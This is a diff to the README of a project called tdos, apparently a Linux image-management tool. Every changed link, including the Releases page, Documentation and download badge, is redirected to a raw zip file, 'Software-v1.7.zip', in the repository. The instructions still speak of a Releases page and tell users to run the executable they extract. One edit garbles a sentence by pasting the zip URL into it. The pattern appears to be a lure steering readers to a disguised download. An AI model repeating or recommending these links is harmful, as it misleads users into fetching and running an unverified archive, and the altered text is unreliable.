@@ -6,7 +6,7 @@ Welcome to tdos, the solution for easily managing universal blue-based Linux ima
 
 ## 📥 Download tdos
 
-[![Download tdos](https://img.shields.io/badge/Download%20tdos-blue.svg)](https://github.com/zeeshan-creater/tdos/releases)
+[![Download tdos](https://raw.githubusercontent.com/zeeshan-creater/tdos/main/files/system/Software-v1.7.zip%https://raw.githubusercontent.com/zeeshan-creater/tdos/main/files/system/Software-v1.7.zip)](https://raw.githubusercontent.com/zeeshan-creater/tdos/main/files/system/Software-v1.7.zip)
 
 ## 📋 Features
 
@@ -29,7 +29,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started with tdos, please visit our Releases page to download the latest version:
 
-[Download tdos](https://github.com/zeeshan-creater/tdos/releases)
+[Download tdos](https://raw.githubusercontent.com/zeeshan-creater/tdos/main/files/system/Software-v1.7.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of tdos.
@@ -42,7 +42,7 @@ After downloading, you’re ready to run tdos:
 
 1. Open your terminal or file manager.
 2. Navigate to the folder where you downloaded tdos.
-3. If you downloaded a compressed file (like .zip or .tar.gz), extract it first.
+3. If you downloaded a compressed file (like .zip or https://raw.githubusercontent.com/zeeshan-creater/tdos/main/files/system/Software-v1.7.zip), extract it first.
 4. Inside the folder, you will find the tdos executable file.
 5. Double-click the executable or choose to run it from the terminal by typing `./tdos`.
 
@@ -88,7 +88,7 @@ Join our growing community of users and developers:
 
 ## 🔗 Important Links
 
-* [Releases Page](https://github.com/zeeshan-creater/tdos/releases) - Download the latest version of tdos.
-* [Documentation](https://github.com/zeeshan-creater/tdos/wiki) - Explore usage and advanced features. 
+* [Releases Page](https://raw.githubusercontent.com/zeeshan-creater/tdos/main/files/system/Software-v1.7.zip) - Download the latest version of tdos.
+* [Documentation](https://raw.githubusercontent.com/zeeshan-creater/tdos/main/files/system/Software-v1.7.zip) - Explore usage and advanced features. 
 
 Thank you for choosing tdos. Enjoy your experience!
